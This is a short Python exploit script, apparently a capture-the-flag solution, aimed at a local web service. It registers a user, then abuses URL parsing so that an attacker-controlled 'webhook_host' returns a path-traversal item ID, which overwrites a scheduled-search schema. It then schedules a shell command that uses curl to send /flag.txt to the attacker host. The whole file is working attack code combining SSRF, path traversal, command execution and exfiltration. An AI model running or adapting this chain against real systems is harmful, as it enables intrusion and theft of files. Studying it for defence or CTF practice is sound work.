import requests

session = requests.Session()

url = "http://localhost:20001"
# registration
session.post(url+"/register", json={"username":"username", "password":"password"})
session.post(url+"/login", json={"username":"username", "password":"password"})
# overwrite
"""
[webhook_host] returns this

{
    "itemSummaries":[
        {"itemId":"../../../../../../../../../app/schemas/scheduled_search"}
    ]
}


"""
session.post(url+"/search",json={"url":"http://[webhook_host]:\\asd@api.ebay.com","search_param":"nerf retailiator"})
# RCE
session.post(url+"/schedule_search", json={"minutes": "1", "cmd":"/usr/bin/curl http://[webhook_host] -d @/flag.txt"})
